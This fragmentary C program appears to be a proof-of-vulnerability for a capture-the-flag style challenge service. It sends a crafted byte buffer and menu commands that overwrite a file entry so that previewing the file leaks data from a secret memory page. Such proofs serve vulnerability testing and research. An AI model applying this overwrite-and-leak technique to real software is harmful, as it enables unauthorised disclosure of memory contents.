...
int main() {
  ...
  char exploit[] =
      "\x00\x41\x41\x41\x41\x20\x20\x20\x20\x20\x20\x20\x00\x00\x00\x00\x00\x00"
  ...
  // Preview file that was created via the overwrite -- since the file has a
  // cluster that indexes into the secret page previewing the file leaks data
  // from the magic page
  transmit_all(STDOUT, "3" NL, sizeof("3" NL) - 1);
  transmit_all(STDOUT, "/EXPLOITDIR/AAAA" NL,
               sizeof("/EXPLOITDIR/AAAA" NL) - 1);
